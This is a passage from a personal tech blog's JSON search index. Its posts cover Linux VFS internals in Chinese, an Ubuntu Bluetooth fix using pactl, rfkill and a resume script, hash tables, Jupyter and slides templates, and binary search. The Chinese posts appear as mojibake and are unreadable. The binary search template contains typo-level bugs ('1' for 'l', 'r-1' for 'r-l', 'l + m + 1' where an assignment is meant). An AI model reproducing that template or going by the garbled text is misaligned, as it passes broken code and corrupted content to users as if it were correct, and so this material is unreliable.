å¸¦æœ‰ä¼˜å…ˆçº§ï¼Œå…ƒç´ æŒ‰ç…§ä¼˜å…ˆçº§","tags":"Node","title":"ç®—æ³•åˆ†æä¸è®¾è®¡ï¼ä¼˜å…ˆçº§é˜Ÿåˆ—","type":"post"},{"authors":null,"categories":[["Linux"]],"content":"VFS æ–‡ä»¶ç³»ç»Ÿ VFS æ˜¯ä¸€ä¸ªè½¯ä»¶å±‚,ç”¨æ¥å¤„ç†ä¸ Unix/Linux æ ‡å‡†æ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„æ‰€æœ‰ç³»ç»Ÿè°ƒç”¨ã€‚æ˜¯ç”¨æˆ·åº”ç”¨ç¨‹åºä¸æ–‡ä»¶ç³»ç»Ÿå®ç°ä¹‹é—´çš„æŠ½è±¡å±‚,VFS èƒ½ä¸ºå„ç§æ–‡ä»¶ç³»ç»Ÿæä¾›ä¸€ä¸ªé€šç”¨çš„ã€ç»Ÿä¸€çš„æ¥å£ã€‚(ä½œç”¨)\nVFS ä¸­æè¿°å„å¯¹è±¡çš„æ•°æ®ç»“æ„:\nè¶…çº§å—å¯¹è±¡ super_block; ç´¢å¼•èŠ‚ç‚¹å¯¹è±¡ inode; æ–‡ä»¶å¯¹è±¡ file; ç›®å½•é¡¹å¯¹è±¡ dentryã€‚ è¶…çº§å—å¯¹è±¡(super block) è¶…çº§å—å¯¹è±¡æè¿°ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯;å¯¹äºæ¯ä¸ªå…·ä½“çš„æ–‡ä»¶ç³»ç»Ÿæ¥è¯´,éƒ½æœ‰å„è‡ªçš„è¶…çº§å—,å¦‚ Ext2 è¶…çº§å—,å¹¶è¢«å­˜æ”¾åœ¨ç£ç›˜ç‰¹å®šæ‰‡åŒºä¸Šã€‚å½“å†…æ ¸å¯¹ä¸€ä¸ªå…·ä½“æ–‡ä»¶ç³»ç»Ÿè¿›è¡Œ mount å®‰è£…æ—¶,è°ƒç”¨æ–‡ä»¶ç³»ç»Ÿæä¾›çš„å‡½æ•°ä¸ºå…¶åˆ†é…ä¸€ä¸ª VFS è¶…çº§å—,å¹¶ä»æ­¤åˆ¤è¯»å–å…·ä½“æ–‡ä»¶ç³»ç»Ÿè¶…çº§å—ä¸­çš„ä¿¡æ¯å¡«å……è¿›æ¥ã€‚\nVFS è¶…çº§å—æ˜¯å„ä¸ªå…·ä½“æ–‡ä»¶ç³»ç»Ÿå®‰è£…æ—¶æ‰å»ºç«‹çš„,å¹¶åœ¨è¿™äº›å…·ä½“æ–‡ä»¶ç³»ç»Ÿå¸è½½æ—¶è¢«è‡ªåŠ¨åˆ é™¤,æ•… VFS è¶…çº§å—ä»…å­˜äºä¸»å­˜ä¸­\nå…·ä½“æ–‡ä»¶ç³»ç»Ÿçš„ VFS è¶…çº§å—å¯¹è±¡ä½•æ—¶è¢«åˆ›å»º?å¦‚ä½•è¢«åˆ›å»º?\nåœ¨æŒ‚è½½çš„æ—¶å€™è¢«åˆ›å»º,åˆ›å»ºçš„æ–¹å¼æ˜¯ get_sb å’Œ kill_sb åˆ†åˆ«æ˜¯åœ¨æŒ‚è½½(mount)å’Œå¸è½½(unmount)æ–‡ä»¶ç³»ç»Ÿå®ä¾‹æ—¶ä¼šè¢«è°ƒç”¨çš„æ–¹æ³•ã€‚VFS é€šè¿‡ get_sb() å‡½æ•°è¯»å–è¶…çº§å—,é€šè¿‡ kill_sb() å‡½æ•°åˆ é™¤è¶…çº§å—ã€‚\næ–‡ä»¶ç³»ç»Ÿè¢«æŒ‚è½½æ—¶è¯¥æ–‡ä»¶ç³»ç»Ÿå¿…é¡»æ˜¯æ³¨å†Œè¿‡çš„åŸå› ?\nåœ¨æŒ‚è½½çš„æ—¶å€™ä¼šæ£€æŸ¥è¯¥æ–‡ä»¶ç³»ç»Ÿç±»å‹æ˜¯ä¸æ˜¯å·²ç»æ³¨å†Œè¿‡çš„æ–‡ä»¶ç³»ç»Ÿçš„ç±»å‹,å¦‚æœæ˜¯,åˆ™åœ¨ç³»ç»Ÿä¸­æ‰¾åˆ°å¯¹åº”çš„æ–‡ä»¶ç³»ç»Ÿçš„ç›¸å…³æ•°æ®ç»“æ„,ç”¨æ¥å¡«å…… VFS çš„è¶…çº§å—å¯¹è±¡ã€‚\næ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿéƒ½æœ‰ä¸€ä¸ªåˆå§‹åŒ–å‡½æ•°,ä»–ç”¨äºå‘ VFS æ³¨å†Œ,å³å¡«å†™æœ‰ file_systems æŒ‡å‘çš„æ–‡ä»¶ç³»ç»Ÿæ³¨å†Œè¡¨æ•°æ®ç»“æ„ file_system_typeã€‚æ¯ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿç±»å‹åœ¨æ³¨å†Œè¡¨ä¸­æœ‰ä¸€ä¸ªç™»è®°é¡¹,è®°å½•äº†è¯¥æ–‡ä»¶ç³»ç»Ÿçš„ç±»å‹å,æ–‡ä»¶ç³»ç»Ÿç‰¹æ€§,æŒ‡å‘å¯¹åº”çš„ VFS æ•°æ®å—è¯»å–å‡½æ•°çš„åœ°å€åŠå·²æ³¨å†Œé¡¹çš„é“¾æŒ‡é’ˆç­‰ã€‚å½“è£…å…¥ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿæ—¶,åº”é¦–å…ˆå‘å†…æ ¸æ³¨å†Œè¯¥æ–‡ä»¶åŠå…¶ç±»å‹,å½“å¸è½½ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿæ—¶,åº”å‘å†…æ ¸ç”³è¯·æ³¨é”€è¯¥ç³» ç»ŸåŠç±»å‹ã€‚æ–‡ä»¶ç³»ç»Ÿç±»å‹çš„æ³¨å†Œåæ˜ åœ¨ä»¥ file_systems ä¸ºé“¾è¡¨å¤´,ä»¥ file_system_type ä¸ºèŠ‚ç‚¹çš„é“¾è¡¨ä¸­ã€‚é“¾è¡¨çš„æ¯ä¸€ä¸ª file_system_type èŠ‚ç‚¹æè¿°äº†ä¸€ä¸ªå·²æ³¨å†Œçš„æ–‡ä»¶ç³»ç»Ÿç±»å‹ã€‚\nç´¢å¼•ç»“ç‚¹å¯¹è±¡(inode) Inode å¯¹è±¡å†…åŒ…å«äº†å†…æ ¸åœ¨æ“ä½œæ–‡ä»¶æˆ–ç›®å½•æ—¶éœ€è¦çš„å…¨éƒ¨ä¿¡æ¯,æ–‡ä»¶åå¯ä»¥æ›´æ”¹,ä½† inode å¯¹æ–‡ä»¶æ˜¯å”¯ä¸€çš„, ä¸”éšæ–‡ä»¶çš„å­˜åœ¨è€Œå­˜åœ¨ã€‚ä¸€ä¸ª Inode ä»£è¡¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ–‡ä»¶,å®ƒå¯ä»¥æ˜¯è®¾å¤‡æˆ–ç®¡é“è¿™ç±»ç‰¹æ®Šæ–‡ä»¶,æ•… Inode ä¸­ä¼šåŒ…å«ç‰¹æ®Šçš„é¡¹ã€‚VFS æŠŠæ¯ä¸ªç›®å½•çœ‹ä½œä¸€ä¸ªæ–‡ä»¶,å¦‚åœ¨è·¯å¾„/tmp/test ä¸­,tmp å’Œ test éƒ½æ˜¯æ–‡ä»¶, tmp æ˜¯ç›®å½•æ–‡ä»¶,è€Œ test æ˜¯æ™®é€šæ–‡ä»¶; tmp å’Œ test éƒ½æœ‰ä¸€ä¸ª inode å¯¹è±¡è¡¨ç¤ºã€‚æ¯ä¸€ä¸ªæ–‡ä»¶é™¤äº†æœ‰ä¸€ä¸ª inode æ•°æ®ç»“æ„å¤–,è¿˜æœ‰ä¸€ä¸ª dentry æ•°æ®ç»“æ„ä¸ä¹‹å…³è”,è¯¥ç»“æ„ä¸­çš„ d_inode æŒ‡é’ˆæŒ‡å‘ç›¸åº”çš„ inode ç»“æ„ã€‚\næ–‡ä»¶å¯¹è±¡(file) æ–‡ä»¶å¯¹è±¡åœ¨ç£ç›˜ä¸Šæ²¡æœ‰æ˜ åƒ,åœ¨æ–‡ä»¶è¢«æ‰“å¼€æ—¶åˆ›å»ºç”±ä¸€ä¸ª file ç»“æ„ç»„æˆã€‚æ–‡ä»¶å¯¹è±¡ä¸­çš„ä¿¡æ¯ä¸»è¦æ˜¯æ–‡ä»¶æŒ‡é’ˆ,å³æ–‡ä»¶ä¸­å½“å‰çš„ä½ç½®,ä¸‹ä¸€ä¸ªæ“ä½œå°†åœ¨è¯¥ä½ç½®å‘ç”Ÿã€‚file ç»“æ„é™¤ä¿å­˜æ–‡ä»¶å½“å‰ä½ç½®å¤–,è¿˜æŠŠæŒ‡å‘è¯¥æ–‡ä»¶ inode çš„æŒ‡é’ˆæ”¾åœ¨å…¶ä¸­,å¹¶å½¢æˆä¸€ä¸ªåŒé¡¹é“¾è¡¨,ç§°ç³»ç»Ÿæ‰“å¼€æ–‡ä»¶è¡¨.\nç›®å½•é¡¹å¯¹è±¡(dentry) Dentry æ•°æ®ç»“æ„å¯ä»¥åŠ å¿«å¯¹æ–‡ä»¶çš„å¿«é€Ÿå®šä½,æ”¹è¿›æ–‡ä»¶ç³»ç»Ÿçš„æ•ˆç‡ã€‚Dentry æè¿°æ–‡ä»¶çš„é€»è¾‘å±æ€§,å®ƒåœ¨ç£ç›˜ä¸Šæ²¡æœ‰å¯¹åº”çš„æ˜ åƒ; inode ç»“æ„è®°å½•æ–‡ä»¶çš„ç‰©ç†å±æ€§,åœ¨ç£ç›˜ä¸Šæœ‰å¯¹åº”çš„æ˜ åƒ.\nä¸è¿›ç¨‹æœ‰å…³çš„æ–‡ä»¶ç³»ç»Ÿçš„æ•°æ®ç»“æ„åŠä½œç”¨(Files_struct, fs_struct) ç”¨æˆ·æ‰“å¼€æ–‡ä»¶ç›¸å…³ä¿¡æ¯ files_struct ç³»ç»Ÿæ‰“å¼€è¡¨ä¿¡æ¯\nè¿›ç¨‹çš„å½“å‰å·¥ä½œç›®å½•ä¸æ ¹ç›®å½•ç›¸å…³ä¿¡æ¯ fs_struct Open çš„æ‰§è¡Œè¿‡ç¨‹ è¯»å†™æ–‡ä»¶ä¹‹å‰å¿…é¡»å…ˆæ‰“å¼€æ–‡ä»¶ã€‚åœ¨æ–‡ä»¶è¢«æ‰“å¼€çš„è¿‡ç¨‹ä¸­,è¦æ ¹æ®ç»™å®šçš„æ–‡ä»¶è·¯å¾„åæœç´¢ç›®å½•ç»“æ„ã€‚åœ¨å†…å­˜,å¸¸å¸¸ç¼“å­˜éƒ¨åˆ†ç›®å½•ç»“æ„ä»¥ä¾¿åŠ é€Ÿç›®å½•æ“ä½œã€‚ä¸€æ—¦æ–‡ä»¶è¢«æ‰¾åˆ°,æ–‡ä»¶çš„ FCB è¢«å¤åˆ¶åˆ°å†…å­˜é‡Œçš„ç³»ç»Ÿæ‰“å¼€æ–‡ä»¶è¡¨é‡Œã€‚è¯¥è¡¨ä¸ä»…å­˜å‚¨ FCB,è¿˜è®°å½•æ‰“å¼€è¯¥æ–‡ä»¶çš„è¿›ç¨‹æ•°ã€‚æ¥ç€,åœ¨è¿›ç¨‹æ‰“å¼€æ–‡ä»¶è¡¨é‡Œåˆ›å»ºä¸€ä¸ªæŒ‡é’ˆå­—æ®µ,æŒ‡å‘ç³»ç»Ÿæ‰“å¼€æ–‡ä»¶è¡¨é‡Œç›¸åº”çš„è¡¨é¡¹ã€‚\næ‰“å¼€æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨è¿”å›æŒ‡å‘è¿›ç¨‹æ‰“å¼€æ–‡ä»¶è¡¨ç›¸åº”é¡¹çš„æŒ‡é’ˆ,ä»¥åæ–‡ä»¶çš„æ“ä½œéƒ½é€šè¿‡è¿™ä¸ªæŒ‡é’ˆè¿›è¡Œã€‚åœ¨ UNIX ç³»ç»Ÿ,æ‰“å¼€æ–‡ä»¶ç³»ç»Ÿè°ƒç”¨è¿”å›çš„æ˜¯æ–‡ä»¶æè¿°ç¬¦.\næ³¨æ„:åœ¨ linux ä¸­æ–‡ä»¶æ§åˆ¶å—ä¸º inode é¡¹\nå½“è¿›ç¨‹å…³é—­æ–‡ä»¶æ—¶,ç›¸åº”çš„è¿›ç¨‹æ‰“å¼€æ–‡ä»¶è¡¨é¡¹è¢«åˆ é™¤,ç›¸åº”çš„ç³»ç»Ÿæ‰“å¼€æ–‡ä»¶è¡¨é¡¹é‡Œçš„æ–‡ä»¶æ‰“å¼€æ¬¡æ•°å‡ä¸€ã€‚å½“æ‰€æœ‰æ‰“å¼€è¯¥æ–‡ä»¶çš„è¿›ç¨‹éƒ½å…³é—­è¯¥æ–‡ä»¶æ—¶,å·²ä¿®æ”¹çš„æ–‡ä»¶ä¿¡æ¯è¢«å†™å›ç£ç›˜,ç›¸åº”çš„ç³»ç»Ÿæ‰“å¼€æ–‡ä»¶è¡¨é¡¹è¢«åˆ é™¤ã€‚\nå®é™…ä¸Š,open ç³»ç»Ÿè°ƒç”¨é¦–å…ˆæœç´¢ç³»ç»Ÿæ‰“å¼€æ–‡ä»¶è¡¨,çœ‹è¯¥æ–‡ä»¶æ˜¯å¦å·²è¢«å…¶å®ƒè¿›ç¨‹æ‰“å¼€äº†ã€‚å¦‚æœå·²ç»æ‰“å¼€äº†,åœ¨è¿›ç¨‹æ‰“å¼€æ–‡ä»¶è¡¨é‡Œå¢åŠ ä¸€ä¸ªæŒ‡é’ˆ,æŒ‡å‘è¯¥æ–‡ä»¶åœ¨ç³»ç»Ÿæ‰“å¼€æ–‡ä»¶è¡¨é‡Œæ‰€å ç”¨çš„è¡¨é¡¹å³å¯ã€‚ VFS ç³»ç»Ÿè°ƒç”¨çš„å®ç°è¿‡ç¨‹:\næ–‡ä»¶çš„æ‰“å¼€ä¸å…³é—­\nç”¨æˆ·è¿›ç¨‹åœ¨è¯»/å†™ä¸€ä¸ªæ–‡ä»¶ä¹‹å‰å¿…é¡»å…ˆæ‰“å¼€è¿™ä¸ªæ–‡ä»¶ã€‚æ‰€è°“æ‰“å¼€æ–‡ä»¶å®è´¨ä¸Šæ˜¯åœ¨è¿›ç¨‹ä¸æ–‡ä»¶ä¹‹é—´å»ºç«‹è¿æ¥,è€Œæ‰“å¼€æ–‡ä»¶æè¿°ç¬¦å”¯ä¸€åœ°æ ‡è¯†ç€è¿™ä¸ªè¿æ¥ã€‚ åº”ç”¨ç¨‹åºå¯¹ open ( )çš„è°ƒç”¨å°†å¼•èµ·å†…æ ¸è°ƒç”¨æœåŠ¡ä¾‹ç¨‹ sys_open ( )å‡½æ•°,è¯¥å‡½æ•°æ¥æ”¶çš„å‚æ•°ä¸º: è¦æ‰“å¼€æ–‡ä»¶çš„è·¯å¾„åå’Œè®¿é—®æ¨¡å¼ç­‰ã€‚è¯¥ç³»ç»Ÿè°ƒç”¨æˆåŠŸåå°†è¿”å›ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦,ä¹Ÿå°±æ˜¯æ–‡ä»¶å¯¹è±¡æŒ‡ é’ˆæ•°ç»„çš„ä¸€ä¸ªç´¢å¼•;ç³»ç»Ÿè°ƒç”¨ä¸æˆåŠŸæ—¶è¿”å›-1ã€‚ ç”¨æˆ·ç¨‹åºé€šè¿‡ close ( )ç³»ç»Ÿè°ƒç”¨å…³é—­æ‰“å¼€çš„æ–‡ä»¶,è¯¥å‡½æ•°æ¥æ”¶çš„å‚æ•°ä¸ºè¦å…³é—­æ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ã€‚å†…æ ¸æœåŠ¡ä¾‹ç¨‹ä¸º sys_close ( )å‡½æ•°ã€‚ æ–‡ä»¶çš„è¯»ä¸å†™\næ–‡ä»¶çš„è¯»/å†™ä¸»è¦æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨ read ( )å’Œ write ( )å®Œæˆçš„,å¯¹äºè¯»/å†™æ–‡ä»¶çš„è¿›ç¨‹,ç›®æ ‡æ–‡ä»¶æ˜¯ç”±ä¸€ä¸ªæ‰“å¼€æ–‡ä»¶æè¿°ç¬¦ä»£è¡¨çš„ã€‚ read ( )å’Œ write ( )çš„æœåŠ¡ä¾‹ç¨‹åˆ†åˆ«æ˜¯ sys_read ( )å’Œ sys_write ( )å‡½æ•°ã€‚å®ƒä»¬éƒ½éœ€è¦ä¸‰ä¸ªå‚æ•°:ä¸€ä¸ªæ–‡ä»¶æè¿°ç¬¦ fd;ä¸€ä¸ªåŒ…å«è¦ä¼ é€æ•°æ®çš„å†…å­˜ç¼“å†²åŒºåœ°å€ buf;ä¸€ä¸ªæŒ‡å®šåº”è¯¥ä¼ é€å¤šå°‘å­—èŠ‚æ•°çš„ countã€‚read ( )æŠŠæ•°æ®ä»æ–‡ä»¶ä¼ é€åˆ°ç¼“å†²åŒº,è€Œ write ( )æ‰§è¡Œç›¸åçš„æ“ä½œã€‚ ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨éƒ½è¿”å›æ‰€æˆåŠŸä¼ é€çš„å­—èŠ‚æ•°,æˆ–è€…å‘ä¸€ä¸ªé”™è¯¯ä¿¡å·å¹¶è¿”å›-1ã€‚è¯»æˆ–å†™æ“ä½œæ€»æ˜¯å‘ç”Ÿåœ¨ç”±å½“å‰æ–‡ä»¶æŒ‡é’ˆæ‰€æŒ‡å®šçš„æ–‡ä»¶åç§»é‡å¤„(æ–‡ä»¶å¯¹è±¡çš„ f_pos åŸŸ)ã€‚ä¸¤ä¸ªç³»ç»Ÿè°ƒç”¨éƒ½é€šè¿‡æŠŠæ‰€ä¼ é€çš„å­—èŠ‚æ•°åŠ åˆ°æ–‡ä»¶æŒ‡é’ˆæ¥æ›´æ–°æ–‡ä»¶æŒ‡é’ˆ ","date":1553508190,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1553508190,"objectID":"17d13121bfec55c93396a05dfa21eceb","permalink":"http://www.guozet.me/post/Linux-Basic-Concepts/","publishdate":"2019-03-25T10:03:10Z","relpermalink":"/post/Linux-Basic-Concepts/","section":"post","summary":"VFS æ–‡ä»¶ç³»ç»Ÿ VFS æ˜¯ä¸€ä¸ªè½¯ä»¶å±‚,ç”¨æ¥å¤„ç†ä¸ Unix/Linux æ ‡å‡†æ–‡ä»¶ç³»ç»Ÿç›¸å…³çš„æ‰€æœ‰","tags":"Linux","title":"Linux Basic Concepts","type":"post"},{"authors":null,"categories":[["Notes"]],"content":"Introduce [I ran into this issue on my Lenovo P51 running Ubuntu 18.04, and I discovered that the pactl module \u0026ldquo;module-bluetooth-discover\u0026rdquo; was not loading properly at boot time. I fixed the issue by replacing it with \u0026ldquo;module-bluez5-discover\u0026rdquo; in my pulse configuration.\nYou can test this by running:\nsudo pactl unload-module module-bluetooth-discover\nsudo pactl load-module module-bluez5-discover\nAnd try to repair/reconnect your devices. If it works, replicate the following configuration in your /etc/pulse/default.pa config. ]( 4\nI ran into this issue on my Lenovo P51 running Ubuntu 18.04, and I discovered that the pactl module \u0026ldquo;module-bluetooth-discover\u0026rdquo; was not loading properly at boot time. I fixed the issue by replacing it with \u0026ldquo;module-bluez5-discover\u0026rdquo; in my pulse configuration.\nYou can test this by running:\nsudo pactl unload-module module-bluetooth-discover\nsudo pactl load-module module-bluez5-discover\nAnd try to repair/reconnect your devices. If it works, replicate the following configuration in your /etc/pulse/default.pa config.\n# Modify: /etc/pulse/default.pa # Comment out the following line .ifexists module-bluetooth-discover.so load-module module-bluetooth-discover .endif # Replace it with ... .ifexists module-bluez5-discover.so load-module module-bluez5-discover .endif My suspicion is that this is a change that was made during the switch from Unity to Gnome and the leftover configurations remained, leaving the standard Bluetooth modules behind which don\u0026rsquo;t load correctly.\nAfter switching to bluez5, I have since had no issues, and Bluetooth connects without complaint on my mobile phone, mouse, and headset. :)\nEDIT: I also followed several steps mentioned here: Bluetooth doesn\u0026rsquo;t work after resuming from sleep, Ubuntu 18.04 LTS\nTo exactly replicate my configuration, make sure you apt-get install bluez blueman pulseaudioto have all the same packages. As was suggested in the referenced problem, I believe this was caused by upgrading to 18.04 from 17.04.)\nupdate bluez to \u0026gt;=5.28.2 18.04 ships with a buggy bluez package for now; newer version is available from this PPA: https://launchpad.net/~bluetooth/+archive/ubuntu/bluez:\nsudo add-apt-repository ppa:bluetooth/bluez sudo apt install bluez workaround for buggy Bluetooth applet (Unity specific?) This is probably the issue @solstice mentioned - BT menu applet doesn\u0026rsquo;t let me enable Bluetooth after resuming from sleep. No matter if the toggle switch is off or on, the BT icon is disabled, and rfkill output doesn\u0026rsquo;t change:\n$ rfkill list 0: phy0: Wireless LAN Soft blocked: no Hard blocked: no 12: hci0: Bluetooth Soft blocked: no Hard blocked: no You can toggle BT manually by running (substitute your own ID):\nrfkill block 12 rfkill unblock 12 and BT applet should pick it up correctly now. At this point, you should be able to connect to your devices. For now I\u0026rsquo;ve hacked it together using a script that does this automatically after resume:\n$ cat /lib/systemd/system-sleep/bt #!/bin/sh case $1 in post) sleep 5 rfkill block `rfkill list | grep hci | cut -d: -f1` sleep 1 rfkill unblock `rfkill list | grep hci | cut -d: -f1` ;; esac The ID number next to hci0 in rfkill list output seems to increment after every suspend/resume. Disabling/enabling BT using the BT menu should change the output (\u0026lsquo;soft blocked: yes\u0026rsquo; for BT disabled via menu), but it doesn\u0026rsquo;t. My guess is that the applet remembers the wrong device ID and is thus trying to enable a device that no longer exists.\n","date":1550584525,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1550584525,"objectID":"217e038c5a0ef074c685980a3cb8df4f","permalink":"http://www.guozet.me/post/Linux-Bluetooth-Setting/","publishdate":"2019-02-19T13:55:25Z","relpermalink":"/post/Linux-Bluetooth-Setting/","section":"post","summary":"Introduce [I ran into this issue on my Lenovo P51 running Ubuntu 18.04, and I discovered that the pactl module \u0026ldquo;module-bluetooth-discover\u0026rdquo; was not loading properly at boot time. I fixed the issue by replacing it with \u0026ldquo;module-bluez5-discover\u0026rdquo; in my pulse configuration.","tags":"Node","title":"Linux Bluetooth Setting","type":"post"},{"authors":null,"categories":[["Notes"]],"content":"Hash Table There are four part we need to talk about the Hash-Table: Hash Function, Separate Chaining, Linear Probing and Context\nHash tables, a data structure that achieves constant-time performance for core symbol table operations, provided that search keys are standard data types or simply defined. Then we consider several fundamental (and useful) examples of symbol-table clients.\nBasic Plan For Hash-Table\nSave items in a key-indexed table (index is a function of the key).\nHash function. Method for computing array index from key.\nHash(\u0026quot;it\u0026quot;) = 3\nThe issues for this part:\nWe need to computing the hash function. Equality test: Method for checking whether tow keys are equal. Collision resolution: Algorithm and data structure to handle tow keys that hash to the same array index. Classic space-time tradeoff.\nNo space limitation: Travial hash function with key as index. No time limitation: Travial collision resolution with sequential search. Space and time limitations: Hashing(The real world.) Hash function Efficiently computable ","date":1549800443,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1549800443,"objectID":"16ac1ff444f5634243ea10647066c1b2","permalink":"http://www.guozet.me/post/Algorithm-part-I-Hash-Table/","publishdate":"2019-02-10T12:07:23Z","relpermalink":"/post/Algorithm-part-I-Hash-Table/","section":"post","summary":"Hash Table There are four part we need to talk about the Hash-Table: Hash Function, Separate Chaining, Linear Probing and Context\nHash tables, a data structure that achieves constant-time performance for core symbol table operations, provided that search keys are standard data types or simply defined.","tags":"Node","title":"Algorithm part I Hash Table","type":"post"},{"authors":["Terry Tang"],"categories":[],"content":"from IPython.core.display import Image Image('https://www.python.org/static/community_logos/python-logo-master-v3-TM-flattened.png') print(\u0026quot;Welcome to Academic!\u0026quot;) Welcome to Academic! Install Python and JupyterLab Install Anaconda which includes Python 3 and JupyterLab.\nAlternatively, install JupyterLab with pip3 install jupyterlab.\nCreate or upload a Jupyter notebook Run the following commands in your Terminal, substituting \u0026lt;MY-WEBSITE-FOLDER\u0026gt; and \u0026lt;SHORT-POST-TITLE\u0026gt; with the file path to your Academic website folder and a short title for your blog post (use hyphens instead of spaces), respectively:\nmkdir -p \u0026lt;MY-WEBSITE-FOLDER\u0026gt;/content/post/\u0026lt;SHORT-POST-TITLE\u0026gt;/ cd \u0026lt;MY-WEBSITE-FOLDER\u0026gt;/content/post/\u0026lt;SHORT-POST-TITLE\u0026gt;/ jupyter lab index.ipynb The jupyter command above will launch the JupyterLab editor, allowing us to add Academic metadata and write the content.\nEdit your post metadata The first cell of your Jupter notebook will contain your post metadata ( front matter).\nIn Jupter, choose Markdown as the type of the first cell and wrap your Academic metadata in three dashes, indicating that it is YAML front matter:\n--- title: My post's title date: 2019-09-01 # Put any other Academic metadata here... --- Edit the metadata of your post, using the documentation as a guide to the available options.\nTo set a featured image, place an image named featured into your post\u0026rsquo;s folder.\nFor other tips, such as using math, see the guide on writing content with Academic.\nConvert notebook to Markdown jupyter nbconvert index.ipynb --to markdown --NbConvertApp.output_files_dir=. Example This post was created with Jupyter. The orginal files can be found at https://github.com/gcushen/hugo-academic/tree/master/exampleSite/content/post/jupyter\n","date":1549324800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1567641600,"objectID":"6e929dc84ed3ef80467b02e64cd2ed64","permalink":"http://www.guozet.me/post/jupyter/","publishdate":"2019-02-05T00:00:00Z","relpermalink":"/post/jupyter/","section":"post","summary":"Learn how to blog in Academic using Jupyter notebooks","tags":[],"title":"Display Jupyter Notebooks with Academic","type":"post"},{"authors":[],"categories":[],"content":"Create slides in Markdown with Academic Academic | Documentation\nFeatures Efficiently write slides in Markdown 3-in-1: Create, Present, and Publish your slides Supports speaker notes Mobile friendly slides Controls Next: Right Arrow or Space Previous: Left Arrow Start: Home Finish: End Overview: Esc Speaker notes: S Fullscreen: F Zoom: Alt + Click PDF Export: E Code Highlighting Inline code: variable\nCode block:\nporridge = \u0026quot;blueberry\u0026quot; if porridge == \u0026quot;blueberry\u0026quot;: print(\u0026quot;Eating...\u0026quot;) Math In-line math: $x + y = z$\nBlock math:\n$$ f\\left( x \\right) = ;\\frac{{2\\left( {x + 4} \\right)\\left( {x - 4} \\right)}}{{\\left( {x + 4} \\right)\\left( {x + 1} \\right)}} $$\nFragments Make content appear incrementally\n{{% fragment %}} One {{% /fragment %}} {{% fragment %}} **Two** {{% /fragment %}} {{% fragment %}} Three {{% /fragment %}} Press Space to play!\nOne **Two** Three A fragment can accept two optional parameters:\nclass: use a custom style (requires definition in custom CSS) weight: sets the order in which a fragment appears Speaker Notes Add speaker notes to your presentation\n{{% speaker_note %}} - Only the speaker can read these notes - Press `S` key to view {{% /speaker_note %}} Press the S key to view the speaker notes!\nOnly the speaker can read these notes Press S key to view Themes black: Black background, white text, blue links (default) white: White background, black text, blue links league: Gray background, white text, blue links beige: Beige background, dark text, brown links sky: Blue background, thin dark text, blue links night: Black background, thick white text, orange links serif: Cappuccino background, gray text, brown links simple: White background, black text, blue links solarized: Cream-colored background, dark green text, blue links Custom Slide Customize the slide style and background\n{{\u0026lt; slide background-image=\u0026quot;/img/boards.jpg\u0026quot; \u0026gt;}} {{\u0026lt; slide background-color=\u0026quot;#0000FF\u0026quot; \u0026gt;}} {{\u0026lt; slide class=\u0026quot;my-style\u0026quot; \u0026gt;}} Custom CSS Example Let\u0026rsquo;s make headers navy colored.\nCreate assets/css/reveal_custom.css with:\n.reveal section h1, .reveal section h2, .reveal section h3 { color: navy; } Questions? Ask\nDocumentation\n","date":1549324800,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1549324800,"objectID":"0e6de1a61aa83269ff13324f3167c1a9","permalink":"http://www.guozet.me/slides/example/","publishdate":"2019-02-05T00:00:00Z","relpermalink":"/slides/example/","section":"slides","summary":"An introduction to using Academic's Slides feature.","tags":[],"title":"Slides","type":"slides"},{"authors":null,"categories":[["Leetcode"]],"content":" All the pictures in this post are coming from the video: èŠ±èŠ±é…± LeetCode Binary Search - åˆ·é¢˜æ‰¾å·¥ä½œ SP5\nSummary The feature for the Binary Search is: Fast, Fast, Fast. O(log(n))\nWhat is Binary Search? The requirment for the Binary Search is the sorted input data.\nEach node needs to make decision go to left or right. For the Binary Search method, the input data will include three partition: Mid, left array, right array.\nIf the mid number is less than the target number, then go to right array to find the target number. If the mid number is larger than the target number, then go to left array to find the target number. When you go to the left or right way, you can choose the recursive function or not recursive function to solve it.\nThe answer for this question is that the last mid point is the target number which you want to find if there is a target number in the array. If there is no target number in the array, when you find the last mid number and then you can return false or use this number to do something.\nWhy we need Binary Search. There are some states for the above picture:\nThe O(eval) is the time to compare the mid number with the target number and the search space need to move to left part or right part. It may be: O(1), O(n), or O(logn). SO, you can use the input dataset range to choose which mothod you can use to solve this problem. There are two tips which you can use to think which method is good for you to solve this problem.\nTemplate Template 1: Unique and sorted elements Include the left data, but not include the right side.\ndef binary_search(1,r): while l \u0026lt; r: m = 1 + (r-1) // 2 if f(m): return m #optional if g(m): r = m else: l + m + 1 return l #or not find, return the min number As the above picture, if the input element is unique and sorted, then we can easily use this template to deal with these similar problems. Like the example 1.\nIf the Input data\u0026rsquo;s element is not unique. And it have repetitive numbers.\nTemplate 2: Repetitive and sorted elements The lower_bound function will return the first index of i, such that A[i] \u0026gt;= x, So, when you find it, you need to check out if this A[i] may not = x. If the index \u0026gt; len, then there is no number \u0026gt; this.\nExample\nLeetcode 69\nIt is not way to find the real number to fit the requrtment. So, we can find the number the first time bigger than the input.\n","date":1547589124,"expirydate":-62135596800,"kind":"page","lang":"en","lastmod":1547589124,"objectID":"38e346ac74e6413cd49dd1498b58ff52","permalink":"http://www.guozet.me/post/Algorithms-Binary-Search/","publishdate":"2019-01-15T21:52:04Z","relpermalink":"/post/Algorithms-Binary-Search/","section":"post","summary":"All the pictures in this post are coming from the video: èŠ±èŠ±é…± LeetCode Binary Search - åˆ·é¢˜æ‰¾å·¥ä½œ SP5 Summary The feature for the Binary","tags":"Leetcode","title":"Leetcode Algorithms. Binary 